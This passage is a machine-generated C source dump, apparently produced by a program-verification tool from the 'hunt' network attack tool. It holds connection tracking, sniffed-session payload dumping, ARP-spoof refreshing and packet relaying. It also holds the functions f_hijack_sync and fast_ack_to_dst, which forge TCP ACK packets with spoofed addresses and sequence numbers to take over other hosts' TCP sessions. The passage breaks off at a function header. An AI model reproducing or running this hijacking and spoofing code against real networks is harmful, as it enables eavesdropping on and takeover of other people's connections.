  signed int return_value_ht_eq_5;
  _Bool tmp_if_expr_1;
  _Bool tmp_if_expr_2;
  _Bool tmp_if_expr_3;
  if(!(ci == ((struct conn_info *)NULL)))
  {
    return_value_ht_eq_5=ht_eq(key, ci, &uci);
    if(return_value_ht_eq_5 == 1)
    {
      signed int return_value_conn_skip_update_4;
      return_value_conn_skip_update_4=conn_skip_update(ci, p);
      if(return_value_conn_skip_update_4 == 0)
      {
        if((unsigned long int)p->p_iph->saddr == ci->src_addr)
          tmp_if_expr_1 = (unsigned long int)p->p_iph->daddr == ci->dst_addr ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_1 = (_Bool)0;
        if(tmp_if_expr_1)
          tmp_if_expr_2 = p->p_hdr.p_tcph->_anon0._anon1.source == ci->src_port ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_2 = (_Bool)0;
        if(tmp_if_expr_2)
          tmp_if_expr_3 = p->p_hdr.p_tcph->_anon0._anon1.dest == ci->dst_port ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_3 = (_Bool)0;
        if(tmp_if_expr_3)
        {
          if((unsigned long int)p->p_hdr.p_tcph->_anon0._anon1.seq == ci->dst.next_d_seq)
            remove_it = 1;

        }

        else
          if((unsigned long int)p->p_hdr.p_tcph->_anon0._anon1.seq == ci->src.next_d_seq)
            remove_it = 1;

      }

    }

  }

  if(!(remove_it == 0))
  {
    void *return_value_hash_remove_7;
    return_value_hash_remove_7=hash_remove(&conn_table, key, (void *)&uci);
    if(ci == (struct conn_info *)return_value_hash_remove_7)
      conn_free(ci);

    hash_unlock(&conn_table);
  }

  else
  {
    hash_unlock(&conn_table);
    conn_add_update(p);
  }
}

// conn_exist
// file hunt.c line 258
signed int conn_exist(struct user_conn_info *uci)
{
  unsigned int key;
  struct conn_info *ci;
  key=uci_generate_key(uci);
  void *return_value_hash_get_1;
  return_value_hash_get_1=hash_get(&conn_table, key, (void *)uci);
  ci = (struct conn_info *)return_value_hash_get_1;
  if(!(ci == ((struct conn_info *)NULL)))
    return 1;

  else
    return 0;
}

// conn_free
// file hunt.c line 228
void conn_free(struct conn_info *ci)
{
  signed int free_it;
  pthread_mutex_lock(&ci->mutex);
  ci->use_count = ci->use_count - 1;
  if(ci->use_count == 0)
    free_it = 1;

  else
    free_it = 0;
  pthread_mutex_unlock(&ci->mutex);
  if(!(free_it == 0))
    free((void *)ci);

}

// conn_get
// file hunt.c line 242
struct conn_info * conn_get(struct user_conn_info *uci)
{
  unsigned int key;
  struct conn_info *ci;
  key=uci_generate_key(uci);
  hash_lock(&conn_table);
  void *return_value_hash_get_1;
  return_value_hash_get_1=hash_get(&conn_table, key, (void *)uci);
  ci = (struct conn_info *)return_value_hash_get_1;
  if(!(ci == ((struct conn_info *)NULL)))
  {
    pthread_mutex_lock(&ci->mutex);
    ci->use_count = ci->use_count + 1;
    pthread_mutex_unlock(&ci->mutex);
  }

  hash_unlock(&conn_table);
  return ci;
}

// conn_list
// file hunt.c line 919
signed int conn_list(struct user_conn_info **ruci, char **rbuf, signed int with_mac, signed int with_seq)
{
  struct hash_iterator iter;
  struct conn_info *ci;
  struct user_conn_info *uci;
  signed int i;
  signed int count;
  char *b;
  char *b_old;
  char *buf;
  hash_lock(&conn_table);
  count=hash_count(&conn_table);
  void *return_value_hash_iter_get_3;
  if(count == 0)
  {
    hash_unlock(&conn_table);
    if(!(ruci == ((struct user_conn_info **)NULL)))
      *ruci = (struct user_conn_info *)(void *)0;

    if(!(rbuf == ((char **)NULL)))
      *rbuf = (char *)(void *)0;

    return 0;
  }

  else
  {
    if(!(rbuf == ((char **)NULL)))
    {
      void *return_value_malloc_1;
      return_value_malloc_1=malloc((unsigned long int)(count * 512));
      buf = (char *)return_value_malloc_1;
      /* assertion buf */
      assert(buf != ((char *)NULL));
      b = buf;
    }

    else
    {
      buf = (char *)(void *)0;
      b = buf;
    }
    if(!(ruci == ((struct user_conn_info **)NULL)))
    {
      void *return_value_malloc_2;
      return_value_malloc_2=malloc((unsigned long int)count * sizeof(struct user_conn_info) /*24ul*/ );
      uci = (struct user_conn_info *)return_value_malloc_2;
      /* assertion uci */
      assert(uci != ((struct user_conn_info *)NULL));
    }

    else
      uci = (struct user_conn_info *)(void *)0;
    i = 0;
    hash_iter_set(&iter, &conn_table);
    do
    {
      return_value_hash_iter_get_3=hash_iter_get(&iter, (unsigned int *)(void *)0);
      ci = (struct conn_info *)return_value_hash_iter_get_3;
      if(ci == ((struct conn_info *)NULL))
        break;

      if(i >= count)
        break;

      if(!(b == ((char *)NULL)))
      {
        b_old = b;
        char *return_value_host_lookup_4;
        return_value_host_lookup_4=host_lookup((unsigned int)ci->src_addr, hl_mode);
        char *return_value_port_lookup_5;
        return_value_port_lookup_5=port_lookup(ci->src_port, hl_mode);
        signed int return_value_sprintf_6;
        return_value_sprintf_6=sprintf(b, "%d) %s [%s]", i, return_value_host_lookup_4, return_value_port_lookup_5);
        b = b + (signed long int)return_value_sprintf_6;
        signed int return_value_fill_space_to_7;
        return_value_fill_space_to_7=fill_space_to(b, (signed int)(b - b_old), 30);
        b = b + (signed long int)return_value_fill_space_to_7;
        signed int return_value_sprintf_8;
        return_value_sprintf_8=sprintf(b, " --> ");
        b = b + (signed long int)return_value_sprintf_8;
        char *return_value_host_lookup_9;
        return_value_host_lookup_9=host_lookup((unsigned int)ci->dst_addr, hl_mode);
        char *return_value_port_lookup_10;
        return_value_port_lookup_10=port_lookup(ci->dst_port, hl_mode);
        signed int return_value_sprintf_11;
        return_value_sprintf_11=sprintf(b, "%s [%s]\n", return_value_host_lookup_9, return_value_port_lookup_10);
        b = b + (signed long int)return_value_sprintf_11;
        if(!(with_seq == 0))
        {
          b_old = b;
          unsigned int return_value___bswap_32_12;
          return_value___bswap_32_12=__bswap_32((unsigned int)ci->src.next_seq);
          unsigned int return_value___bswap_32_13;
          return_value___bswap_32_13=__bswap_32((unsigned int)ci->src.next_d_seq);
          signed int return_value_sprintf_14;
          return_value_sprintf_14=sprintf(b, "     seq=(%u) ack=(%u)", (unsigned int)return_value___bswap_32_12, (unsigned int)return_value___bswap_32_13);
          b = b + (signed long int)return_value_sprintf_14;
          signed int return_value_fill_space_to_15;
          return_value_fill_space_to_15=fill_space_to(b, (signed int)(b - b_old), 45);
          b = b + (signed long int)return_value_fill_space_to_15;
          unsigned int return_value___bswap_32_16;
          return_value___bswap_32_16=__bswap_32((unsigned int)ci->dst.next_seq);
          unsigned int return_value___bswap_32_17;
          return_value___bswap_32_17=__bswap_32((unsigned int)ci->dst.next_d_seq);
          signed int return_value_sprintf_18;
          return_value_sprintf_18=sprintf(b, " seq=(%u) ack=(%u)\n", (unsigned int)return_value___bswap_32_16, (unsigned int)return_value___bswap_32_17);
          b = b + (signed long int)return_value_sprintf_18;
        }

        if(!(with_mac == 0))
        {
          b_old = b;
          signed int return_value_sprintf_19;
          return_value_sprintf_19=sprintf(b, "     src mac=");
          b = b + (signed long int)return_value_sprintf_19;
          signed int return_value_sprintf_eth_mac_20;
          return_value_sprintf_eth_mac_20=sprintf_eth_mac(b, ci->src.src_mac);
          b = b + (signed long int)return_value_sprintf_eth_mac_20;
          signed int return_value_fill_space_to_21;
          return_value_fill_space_to_21=fill_space_to(b, (signed int)(b - b_old), 45);
          b = b + (signed long int)return_value_fill_space_to_21;
          signed int return_value_sprintf_22;
          return_value_sprintf_22=sprintf(b, " src mac=");
          b = b + (signed long int)return_value_sprintf_22;
          signed int return_value_sprintf_eth_mac_23;
          return_value_sprintf_eth_mac_23=sprintf_eth_mac(b, ci->dst.src_mac);
          b = b + (signed long int)return_value_sprintf_eth_mac_23;
          signed int return_value_sprintf_24;
          return_value_sprintf_24=sprintf(b, "\n");
          b = b + (signed long int)return_value_sprintf_24;
          b_old = b;
          signed int return_value_sprintf_25;
          return_value_sprintf_25=sprintf(b, "     dst mac=");
          b = b + (signed long int)return_value_sprintf_25;
          signed int return_value_sprintf_eth_mac_26;
          return_value_sprintf_eth_mac_26=sprintf_eth_mac(b, ci->src.dst_mac);
          b = b + (signed long int)return_value_sprintf_eth_mac_26;
          signed int return_value_fill_space_to_27;
          return_value_fill_space_to_27=fill_space_to(b, (signed int)(b - b_old), 45);
          b = b + (signed long int)return_value_fill_space_to_27;
          signed int return_value_sprintf_28;
          return_value_sprintf_28=sprintf(b, " dst mac=");
          b = b + (signed long int)return_value_sprintf_28;
          signed int return_value_sprintf_eth_mac_29;
          return_value_sprintf_eth_mac_29=sprintf_eth_mac(b, ci->dst.dst_mac);
          b = b + (signed long int)return_value_sprintf_eth_mac_29;
          signed int return_value_sprintf_30;
          return_value_sprintf_30=sprintf(b, "\n");
          b = b + (signed long int)return_value_sprintf_30;
        }

      }

      if(!(uci == ((struct user_conn_info *)NULL)))
      {
        (uci + (signed long int)i)->src_addr = ci->src_addr;
        (uci + (signed long int)i)->dst_addr = ci->dst_addr;
        (uci + (signed long int)i)->src_port = ci->src_port;
        (uci + (signed long int)i)->dst_port = ci->dst_port;
      }

      i = i + 1;
    }
    while((_Bool)1);
    hash_iter_end(&iter);
    hash_unlock(&conn_table);
    if(!(ruci == ((struct user_conn_info **)NULL)))
      *ruci = uci;

    if(!(rbuf == ((char **)NULL)))
      *rbuf = buf;

    return count;
  }
}

// conn_skip_update
// file hunt.c line 288
static signed int conn_skip_update(struct conn_info *ci, struct packet *p)
{
  struct list_iterator iter;
  struct packet_info *pi;
  list_iter_set(&iter, &l_skip_update);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&iter);
    pi = (struct packet_info *)return_value_list_iter_get_1;
    if(pi == ((struct packet_info *)NULL))
      break;

    signed int return_value_packet_match_2;
    return_value_packet_match_2=packet_match(pi, p);
    if(!(return_value_packet_match_2 == 0))
    {
      list_iter_end(&iter);
      list_remove(&l_skip_update, (void *)pi);
      return 1;
    }

  }
  while((_Bool)1);
  list_iter_end(&iter);
  return 0;
}

// conn_update_table
// file hunt.c line 538
static void conn_update_table(struct packet *p, struct ethhdr *ethh, struct iphdr *iph)
{
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  _Bool tmp_if_expr_3;
  if(!(tcph->_anon0._anon1.syn == 0))
    tmp_if_expr_3 = !(tcph->_anon0._anon1.ack != 0) ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_3 = (_Bool)0;
  _Bool tmp_if_expr_2;
  if(tmp_if_expr_3)
  {
    signed int return_value_conn_add_policy_1;
    return_value_conn_add_policy_1=conn_add_policy(iph, tcph);
    if(!(return_value_conn_add_policy_1 == 0))
      conn_add(p);

  }

  else
  {
    if(!(tcph->_anon0._anon1.rst == 0))
      tmp_if_expr_2 = (_Bool)1;

    else
      tmp_if_expr_2 = tcph->_anon0._anon1.fin != 0 ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_2)
      conn_del(p);

    else
      conn_add_update(p);
  }
}

// count_mask
// file util.c line 90
signed int count_mask(unsigned int mask)
{
  signed int retval = 0;
  for( ; !(mask == 0u); mask = mask >> 1)
    if(!((1u & mask) == 0u))
      retval = retval + 1;

  return retval;
}

// ctrl_c_handler
// file main.c line 101
static void ctrl_c_handler(signed int i)
{
  loop_running = 0;
}

// ctrl_c_handler_link1
// file menu.c line 111
static void ctrl_c_handler_link1(signed int nr)
{
  signed int was_already_signaled = ctrl_c_signaled;
  ctrl_c_signaled = 1;
  if(was_already_signaled == 0)
    siglongjmp(jmp_hostbyname, 1);

}

// ctrl_c_prompt
// file hunt.h line 432
void ctrl_c_prompt(void)
{
  set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
  printf("CTRL-C to break\n");
  set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
  fflush(stdout);
}

// ctrl_c_sync_handler
// file synchijack.c line 455
void ctrl_c_sync_handler(signed int signr)
{
  sync_was_canceled = 1;
  f_sync_done = 1;
}

// db_item_print
// file rstd.c line 219
static void db_item_print(signed int i, struct rst_db_item *dbi)
{
  char *str_mode;
  char buf_src_ports[512l];
  char buf_dst_ports[512l];
  char buf[512l];
  str_mode=sdbmode_to_char(dbi->rst_mode);
  sprintf_db_ports(dbi->src_ports, buf_src_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  sprintf_db_ports(dbi->dst_ports, buf_dst_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  char *return_value_host_lookup_1;
  return_value_host_lookup_1=host_lookup(dbi->src_addr, hl_mode);
  signed int return_value_count_mask_2;
  return_value_count_mask_2=count_mask(dbi->src_mask);
  sprintf(buf, "%s/%d [%s]", return_value_host_lookup_1, return_value_count_mask_2, (const void *)buf_src_ports);
  char *return_value_host_lookup_3;
  return_value_host_lookup_3=host_lookup(dbi->dst_addr, hl_mode);
  signed int return_value_count_mask_4;
  return_value_count_mask_4=count_mask(dbi->dst_mask);
  printf("%2d) %-24s --> %s/%d [%s] rst %s %s\n", i, (const void *)buf, return_value_host_lookup_3, return_value_count_mask_4, (const void *)buf_dst_ports, str_mode, dbi->rst_only_syn != 0 ? "SYN only" : "all");
}

// do_test_or_refresh
// file arpspoof.c line 1205
static void do_test_or_refresh(struct arp_spoof_info *asi)
{
  signed int retval;
  signed int refresh = 0;
  do
  {
    retval=user_arpspoof_test(asi);
    if(retval == 0)
    {
      char *return_value_host_lookup_1;
      return_value_host_lookup_1=host_lookup(asi->dst_addr, hl_mode);
      printf("ARP spoof in host %s - OK\n", return_value_host_lookup_1);
      refresh = 0;
    }

    else
      if(!(retval == -2))
      {
        signed int return_value_menu_choose_char_2;
        return_value_menu_choose_char_2=menu_choose_char("do you want to refresh ARP spoof? y/n", "yn", (char)121);
        if(!(return_value_menu_choose_char_2 == 121))
        {
          if(return_value_menu_choose_char_2 == 110)
            goto __CPROVER_DUMP_L4;

        }

        else
        {
          refresh = 1;
          send_src_spoof_to_dst(asi);
          goto __CPROVER_DUMP_L5;
        }

      __CPROVER_DUMP_L4:
        ;
        refresh = 0;
      }

      else
        refresh = 0;

  __CPROVER_DUMP_L5:
    ;
  }
  while(refresh == 1);
}

// dump_connection
// file main.c line 181
void dump_connection(struct user_conn_info *uci)
{
  signed int c;
  c=menu_choose_sdb("dump", (char)98);
  switch(c)
  {
    case 100:
    {
      dump_connection_uci(uci, 0, 0);
      break;
    }
    case 115:
    {
      dump_connection_uci(uci, 1, 0);
      break;
    }
    case 98:
    {
      c=menu_choose_char("print src/dst same characters y/n", "ny", (char)110);
      switch(c)
      {
        case 110:
        {
          dump_connection_uci(uci, 2, 0);
          break;
        }
        case 121:
          dump_connection_uci(uci, 2, 1);
      }
    }
  }
}

// dump_connection_uci
// file main.c line 111
void dump_connection_uci(struct user_conn_info *uci, signed int mode, signed int same_chars)
{
  struct packet *p;
  struct ifunc_item ifunc_src;
  struct ifunc_item ifunc_dst;
  struct sigaction sac;
  struct sigaction old_sac;
  signed int dst_packet;
  char pbuf[256l];
  signed int pbuf_len;
  clear_scr();
  ctrl_c_prompt();
  list_produce_start(&l_dump_connection);
  if(mode == 0 || mode == 2)
  {
    ifunc_dst.func = (void (*)(struct packet *, void *))func_dump_connection_dst;
    ifunc_dst.arg = (void *)uci;
    list_enqueue(&l_ifunc_tcp, (void *)&ifunc_dst);
  }

  if(mode == 1 || mode == 2)
  {
    ifunc_src.func = (void (*)(struct packet *, void *))func_dump_connection_src;
    ifunc_src.arg = (void *)uci;
    list_enqueue(&l_ifunc_tcp, (void *)&ifunc_src);
  }

  sac.__sigaction_handler.sa_handler = ctrl_c_handler;
  sigemptyset(&sac.sa_mask);
  sigaddset(&sac.sa_mask, 2);
  sac.sa_flags = 0x10000000;
  sigaction(2, &sac, &old_sac);
  loop_running = 1;
  void *return_value_list_consume_1;
  _Bool tmp_if_expr_2;
  _Bool tmp_if_expr_3;
  _Bool tmp_if_expr_4;
  _Bool tmp_if_expr_6;
  unsigned long int tmp_if_expr_5;
  _Bool tmp_if_expr_9;
  _Bool tmp_if_expr_8;
  signed int return_value_memcmp_7;
  while(!(loop_running == 0))
  {
    return_value_list_consume_1=list_consume(&l_dump_connection, (struct timespec *)(void *)0);
    p = (struct packet *)return_value_list_consume_1;
    if(p == ((struct packet *)NULL))
      break;

    if((unsigned long int)p->p_iph->saddr == uci->src_addr)
      tmp_if_expr_2 = (unsigned long int)p->p_iph->daddr == uci->dst_addr ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_2 = (_Bool)0;
    if(tmp_if_expr_2)
      tmp_if_expr_3 = p->p_hdr.p_tcph->_anon0._anon1.source == uci->src_port ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_3 = (_Bool)0;
    if(tmp_if_expr_3)
      tmp_if_expr_4 = p->p_hdr.p_tcph->_anon0._anon1.dest == uci->dst_port ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_4 = (_Bool)0;
    if(tmp_if_expr_4)
      dst_packet = 0;

    else
      dst_packet = 1;
    if(dst_packet == 0)
      tmp_if_expr_6 = p->p_data_len != 0 ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_6 = (_Bool)0;
    if(same_chars == 0 && tmp_if_expr_6)
    {
      if(!((unsigned long int)p->p_data_len >= sizeof(char [256l]) /*256ul*/ ))
        tmp_if_expr_5 = (unsigned long int)p->p_data_len;

      else
        tmp_if_expr_5 = sizeof(char [256l]) /*256ul*/ ;
      pbuf_len = (signed int)tmp_if_expr_5;
      memcpy((void *)pbuf, (const void *)p->p_data, (unsigned long int)pbuf_len);
    }

    else
      pbuf_len = 0;
    if(!(dst_packet == 0))
      tmp_if_expr_9 = p->p_data_len != 0 ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_9 = (_Bool)0;
    if(same_chars == 0 && tmp_if_expr_9)
    {
      if(p->p_data_len == pbuf_len)
      {
        return_value_memcmp_7=memcmp((const void *)p->p_data, (const void *)pbuf, (unsigned long int)pbuf_len);
        tmp_if_expr_8 = return_value_memcmp_7 == 0 ? (_Bool)1 : (_Bool)0;
      }

      else
        tmp_if_expr_8 = (_Bool)0;
      if(tmp_if_expr_8)
        pbuf_len = 0;

      else
        print_data_packet(p, p->p_data_len, 0, dst_packet);
    }

    else
      print_data_packet(p, p->p_data_len, 0, dst_packet);
    packet_free(p);
  }
  if(mode == 0 || mode == 2)
    list_remove(&l_ifunc_tcp, (void *)&ifunc_dst);

  if(mode == 1 || mode == 2)
    list_remove(&l_ifunc_tcp, (void *)&ifunc_src);

  packet_flush(&l_dump_connection);
  tty_tput_reset();
  press_key("\n\n-- press any key> ");
  sigaction(2, &old_sac, (struct sigaction *)(void *)0);
}

// ethtap_relay
// file pktrelay.c line 142
void ethtap_relay(struct packet *p, struct relay_item *ri)
{
  char buf[4096l];
  signed int len;
  struct ethhdr hdr;
  unsigned short int tmp_statement_expression_2;
  unsigned short int tmp_statement_expression_4;
  if(!(ri->ethtap_fd >= 0))
    printf("ethtap_relay error: ethtap_fd < 0\n");

  else
  {
    buf[(signed long int)1] = (char)0;
    buf[(signed long int)0] = buf[(signed long int)1];
    len = 2;
    memset((void *)&hdr, 0, sizeof(struct ethhdr) /*14ul*/ );
    hdr.h_proto = p->p_ethh->h_proto;
    memcpy((void *)(buf + (signed long int)len), (const void *)&hdr, sizeof(struct ethhdr) /*14ul*/ );
    len = len + (signed int)sizeof(struct ethhdr) /*14ul*/ ;
    memcpy((void *)(buf + (signed long int)len), (const void *)(p->p_raw + (signed long int)sizeof(struct ethhdr) /*14ul*/ ), (unsigned long int)p->p_raw_len - sizeof(struct ethhdr) /*14ul*/ );
    len = len + (signed int)((unsigned long int)p->p_raw_len - sizeof(struct ethhdr) /*14ul*/ );
    char *return_value_host_lookup_1;
    return_value_host_lookup_1=host_lookup(p->p_iph->saddr, hl_mode);
    unsigned short int ethtap_relay__1__2____v;
    unsigned short int ethtap_relay__1__2____x = (unsigned short int)p->p_hdr.p_tcph->_anon0._anon1.source;
    asm("rorw _8, %w0" : "=r"(ethtap_relay__1__2____v) : "0"(ethtap_relay__1__2____x) : "cc");
    tmp_statement_expression_2 = ethtap_relay__1__2____v;
    char *return_value_host_lookup_3;
    return_value_host_lookup_3=host_lookup(p->p_iph->daddr, hl_mode);
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)p->p_hdr.p_tcph->_anon0._anon1.dest;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_4 = __v;
    printf("relay packet %s:%d to %s:%d\n", return_value_host_lookup_1, tmp_statement_expression_2, return_value_host_lookup_3, tmp_statement_expression_4);
    writen(ri->ethtap_fd, buf, len);
  }
}

// f_hijack_sync
// file synchijack.c line 334
void f_hijack_sync(struct packet *p, struct conn_info *ci)
{
  struct tcp_spec ts;
  char buf[512l];
  char *w_data;
  signed int len;
  _Bool tmp_if_expr_13;
  if((unsigned long int)p->p_iph->saddr == ci->src_addr)
    tmp_if_expr_13 = (unsigned long int)p->p_iph->daddr == ci->dst_addr ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_13 = (_Bool)0;
  _Bool tmp_if_expr_14;
  if(tmp_if_expr_13)
    tmp_if_expr_14 = p->p_hdr.p_tcph->_anon0._anon1.source == ci->src_port ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_14 = (_Bool)0;
  _Bool tmp_if_expr_15;
  if(tmp_if_expr_14)
    tmp_if_expr_15 = p->p_hdr.p_tcph->_anon0._anon1.dest == ci->dst_port ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_15 = (_Bool)0;
  _Bool tmp_if_expr_6;
  signed int tmp_if_expr_12;
  unsigned short int tmp_statement_expression_11;
  if(tmp_if_expr_15)
  {
    unsigned int return_value___bswap_32_1;
    return_value___bswap_32_1=__bswap_32_link5((unsigned int)ci->dst.next_d_seq);
    unsigned int return_value___bswap_32_2;
    return_value___bswap_32_2=__bswap_32_link5((unsigned int)ci->src.next_seq);
    need_read = (volatile signed int)(return_value___bswap_32_1 - return_value___bswap_32_2);
    unsigned int return_value___bswap_32_3;
    return_value___bswap_32_3=__bswap_32_link5((unsigned int)ci->dst.next_seq);
    unsigned int return_value___bswap_32_4;
    return_value___bswap_32_4=__bswap_32_link5((unsigned int)ci->src.next_d_seq);
    need_write = (volatile signed int)(return_value___bswap_32_3 - return_value___bswap_32_4);
    static unsigned int last_read_ack;
    if(!(need_read == 0))
    {
      if(need_read >= 1 && need_write >= 0)
      {
        if(p->p_data_len >= 1)
        {
          print_data_packet(p, p->p_data_len, 0, 0);
          need_read_positive(p, ci);
          unsigned int return_value___bswap_32_5;
          return_value___bswap_32_5=__bswap_32_link5((unsigned int)ci->src.next_d_seq);
          last_read_ack=__bswap_32_link5(return_value___bswap_32_5 + (unsigned int)p->p_data_len);
        }

      }

      else
        need_read_write_negative(ci);
    }

    else
      if(need_write >= 1)
      {
        if(!(p->p_data_len == 0))
          print_data_packet(p, p->p_data_len, 0, 0);

        if(last_read_ack == p->p_hdr.p_tcph->_anon0._anon1.ack_seq)
          tmp_if_expr_6 = p->p_data_len != 0 ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_6 = (_Bool)0;
        if(tmp_if_expr_6)
        {
          len = p->p_data_len;
          if((unsigned long int)len >= 513ul)
            len = (signed int)sizeof(char [512l]) /*512ul*/ ;

          memcpy((void *)buf, (const void *)p->p_data, (unsigned long int)len);
          w_data = buf;
        }

        else
        {
          len = 0;
          w_data = (char *)(void *)0;
        }
        need_write_positive(ci, w_data, len);
      }

      else
        if(!(need_write >= 0))
          need_read_write_negative(ci);

        else
          f_sync_done = 1;
  }

  else
    if((unsigned long int)p->p_iph->saddr == ci->dst_addr)
    {
      if((unsigned long int)p->p_iph->daddr == ci->src_addr)
      {
        if(p->p_hdr.p_tcph->_anon0._anon1.source == ci->dst_port)
        {
          if(p->p_hdr.p_tcph->_anon0._anon1.dest == ci->src_port)
          {
            unsigned int return_value___bswap_32_7;
            return_value___bswap_32_7=__bswap_32_link5((unsigned int)ci->dst.next_d_seq);
            unsigned int return_value___bswap_32_8;
            return_value___bswap_32_8=__bswap_32_link5((unsigned int)ci->src.next_seq);
            need_read = (volatile signed int)(return_value___bswap_32_7 - return_value___bswap_32_8);
            unsigned int return_value___bswap_32_9;
            return_value___bswap_32_9=__bswap_32_link5((unsigned int)ci->dst.next_seq);
            unsigned int return_value___bswap_32_10;
            return_value___bswap_32_10=__bswap_32_link5((unsigned int)ci->src.next_d_seq);
            need_write = (volatile signed int)(return_value___bswap_32_9 - return_value___bswap_32_10);
            static unsigned int dst_last_ack;
            if(!((unsigned long int)dst_last_ack == ci->dst.next_seq))
            {
              ts.saddr = ci->src_addr;
              ts.daddr = ci->dst_addr;
              ts.sport = ci->src_port;
              ts.dport = ci->dst_port;
              ts.src_mac = (char *)ci->dst.dst_mac;
              ts.dst_mac = (char *)ci->dst.src_mac;
              ts.seq = ci->dst.next_d_seq;
              ts.ack_seq = ci->dst.next_seq;
              if(!(ci->src.window == 0))
                tmp_if_expr_12 = (signed int)ci->src.window;

              else
              {
                unsigned short int __v;
                unsigned short int __x = (unsigned short int)242;
                asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
                tmp_statement_expression_11 = __v;
                tmp_if_expr_12 = (signed int)tmp_statement_expression_11;
              }
              ts.window = (unsigned short int)tmp_if_expr_12;
              ts.ack = 1;
              ts.psh = 1;
              ts.rst = 0;
              ts.data = (char *)(void *)0;
              ts.data_len = 0;
              send_tcp_packet(&ts);
              dst_last_ack = (unsigned int)ts.ack_seq;
              if(!(need_read >= 0) || !(need_write >= 0))
                need_read_write_negative(ci);

              else
                if(need_read == 0)
                {
                  if(need_write >= 1)
                    need_write_positive(ci, (char *)(void *)0, 0);

                }

                else
                  if(!(nw_was_negative == 0))
                  {
                    nw_was_negative = 0;
                    hijack_sync_init_msg(ci);
                  }

            }

            if(need_read == 0 && need_write == 0)
              f_sync_done = 1;

          }

        }

      }

    }

  packet_free(p);
}

// fast_ack_to_dst
// file hijack.c line 69
void fast_ack_to_dst(struct packet *p, struct conn_info *ci)
{
  struct iphdr *iph;
  struct tcphdr *tcph;
  struct tcp_spec ts;
  iph = p->p_iph;
  tcph = p->p_hdr.p_tcph;
  signed int tmp_if_expr_2;
  unsigned short int tmp_statement_expression_1;
  unsigned short int tmp_statement_expression_3;
  unsigned short int tmp_statement_expression_4;
  if((unsigned long int)iph->saddr == ci->dst_addr)
  {
    if((unsigned long int)iph->daddr == ci->src_addr)
    {
      if(tcph->_anon0._anon1.source == ci->dst_port)
      {
        if(tcph->_anon0._anon1.dest == ci->src_port)
        {
          if(!(p->p_data_len == 0))
          {
            memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
            ts.saddr = ci->src_addr;
            ts.daddr = ci->dst_addr;
            ts.sport = ci->src_port;
            ts.dport = ci->dst_port;
            ts.src_mac = (char *)ci->src.src_mac;
            ts.dst_mac = (char *)ci->dst.src_mac;
            ts.seq = ci->dst.next_d_seq;
            ts.ack_seq = ci->dst.next_seq;
            if(!(ci->src.window == 0))
              tmp_if_expr_2 = (signed int)ci->src.window;

            else
            {
              unsigned short int __v;
              unsigned short int __x = (unsigned short int)242;
              asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
              tmp_statement_expression_1 = __v;
              tmp_if_expr_2 = (signed int)tmp_statement_expression_1;
            }
            ts.window = (unsigned short int)tmp_if_expr_2;
            unsigned short int fast_ack_to_dst__1__1__1__2____v;
            unsigned short int fast_ack_to_dst__1__1__1__2____x;
            unsigned short int fast_ack_to_dst__1__1__1__2__1____v;
            unsigned short int fast_ack_to_dst__1__1__1__2__1____x = (unsigned short int)ci->src.id;
            asm("rorw _8, %w0" : "=r"(fast_ack_to_dst__1__1__1__2__1____v) : "0"(fast_ack_to_dst__1__1__1__2__1____x) : "cc");
            tmp_statement_expression_4 = fast_ack_to_dst__1__1__1__2__1____v;
            fast_ack_to_dst__1__1__1__2____x = (unsigned short int)((signed int)tmp_statement_expression_4 + 1);
            asm("rorw _8, %w0" : "=r"(fast_ack_to_dst__1__1__1__2____v) : "0"(fast_ack_to_dst__1__1__1__2____x) : "cc");
            tmp_statement_expression_3 = fast_ack_to_dst__1__1__1__2____v;
            ts.id = tmp_statement_expression_3;
            ts.ack = 1;
            ts.psh = 0;
            ts.rst = 0;
            ts.data = (char *)(void *)0;
            ts.data_len = 0;
            send_tcp_packet(&ts);
          }

        }

      }

    }

  }

}

// fast_tcp_process
// file hunt.c line 634
static inline void fast_tcp_process(struct packet *p)
{
  struct list_iterator iter;
  struct ifunc_item *li;
  list_lock(&l_ifunc_fast_tcp);
  list_iter_set(&iter, &l_ifunc_fast_tcp);
  void *return_value_list_iter_get_1;
  return_value_list_iter_get_1=list_iter_get(&iter);
  li = (struct ifunc_item *)return_value_list_iter_get_1;
  if(!(li == ((struct ifunc_item *)NULL)))
    li->func(p, li->arg);

  list_iter_end(&iter);
  list_unlock(&l_ifunc_fast_tcp);
}

// fill_space_to
// file hunt.c line 911
static signed int fill_space_to(char *b, signed int pos, signed int where)
{
  if(pos >= 0 && !(pos >= where))
  {
    signed int return_value_sprintf_1;
    return_value_sprintf_1=sprintf(b, "%*s", where - pos, (const void *)"");
    return return_value_sprintf_1;
  }

  else
    return 0;
}

// fill_uci
// file hunt.c line 159
static inline void fill_uci(struct user_conn_info *uci, struct packet *p)
{
  uci->src_addr = (unsigned long int)p->p_iph->saddr;
  uci->dst_addr = (unsigned long int)p->p_iph->daddr;
  uci->src_port = p->p_hdr.p_tcph->_anon0._anon1.source;
  uci->dst_port = p->p_hdr.p_tcph->_anon0._anon1.dest;
}

// find_asi_dst_mac
// file arpspoof.c line 1353
